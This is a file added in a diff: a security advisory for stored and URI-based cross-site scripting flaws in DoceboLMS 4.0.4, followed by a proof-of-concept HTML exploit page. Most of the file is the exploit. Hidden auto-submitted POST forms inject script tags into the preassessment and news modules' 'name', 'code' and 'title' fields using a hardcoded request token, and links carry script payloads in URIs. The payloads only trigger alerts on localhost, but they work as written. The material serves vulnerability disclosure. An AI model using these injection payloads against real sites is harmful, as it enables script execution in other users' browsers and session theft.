@@ -1,0 +1,79 @@
+<!--
+
+DoceboLMS 4.0.4 Multiple Stored XSS Vulnerabilities
+
+
+Vendor: Docebo
+Product web page: http://www.docebo.org
+Affected version: 4.0.4 CE
+
+Summary: DoceboLMS is a SCORM compliant Open Source e-Learning
+platform used in corporate, government and education markets.
+
+Desc: DoceboLMS suffers from multiple stored XSS vulnerabilities
+pre and post auth. Input thru the POST parameters 'name', 'code'
+and 'title' in index.php is not sanitized allowing the attacker
+to execute HTML code into user's browser session on the affected
+site. URI based XSS vulnerabilities are also present.
+
+Tested on: Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Apache 2.2.14 (Win32)
+           PHP 5.3.1
+           MySQL 5.1.41
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            liquidworm gmail com
+
+
+Advisory ID: ZSL-2011-5006
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5006.php
+
+
+02.04.2011
+
+-->
+
+
+<html>
+<title>DoceboLMS 4.0.4 Multiple Stored XSS Vulnerabilities</title>
+<body bgcolor="#1C1C1C">
+<script type="text/javascript">
+function xss1(){document.forms["xss1"].submit();}
+function xss2(){document.forms["xss2"].submit();}
+</script>
+
+<br /><br />
+
+<form action="http://localhost/DoceboLMS_404/doceboCore/index.php?modname=preassessment&op=modassessment" enctype="application/x-www-form-urlencoded" method="POST" id="xss1">
+<input type="hidden" name="authentic_request" value="23dfee506a748201730ab2bb7486e77a" />
+<input type="hidden" name="code" value='"><script>alert(1)</script>' />
+<input type="hidden" name="description" value="ZSL" />
+<input type="hidden" name="id_assess" value="0" />
+<input type="hidden" name="name" value='"><script>alert(2)</script>' />
+<input type="hidden" name="save" value="Save changes" /></form>
+<a href="javascript: xss1();" style="text-decoration:none">
+<b><font color="red"><center><h3>Exploit PreAssessment Module!</h3></center></font></b></a><br /><br />
+
+<form action="http://localhost/DoceboLMS_404/doceboCore/index.php?modname=news&op=savenews" enctype="application/x-www-form-urlencoded" method="POST" id="xss2">
+<input type="hidden" name="authentic_request" value="23dfee506a748201730ab2bb7486e77a" />
+<input type="hidden" name="language" value="2" />
+<input type="hidden" name="long_desc" value="" />
+<input type="hidden" name="news" value="Insert" />
+<input type="hidden" name="short_desc" value="ZSL" />
+<input type="hidden" name="title" value='"><script>alert(1)</script>' /></form>
+<a href="javascript: xss2();" style="text-decoration:none">
+<b><font color="red"><center><h3>Exploit News Module!</h3></center></font></b></a><br /><br />
+
+<a href="http://localhost/DoceboLMS_404/index.php?<script>alert(1)</script>" style="text-decoration:none">
+<b><font color="red"><center><h3>Exploit URI XSS #1</h3></center></font></b></a><br /><br />
+
+<a href="http://localhost/DoceboLMS_404/?<script>alert(1)</script>" style="text-decoration:none">
+<b><font color="red"><center><h3>Exploit URI XSS #2</h3></center></font></b></a><br /><br />
+
+<a href="http://localhost/DoceboLMS_404/docebolms/index.php/index.php?<script>alert(1)</script>" style="text-decoration:none">
+<b><font color="red"><center><h3>Exploit URI XSS #3</h3></center></font></b></a><br /><br />
+
+<a href="http://localhost/DoceboLMS_404/docebolms/?<script>alert(1)</script>" style="text-decoration:none">
+<b><font color="red"><center><h3>Exploit URI XSS #4</h3></center></font></b></a><br /><br />
+
+</body></html>
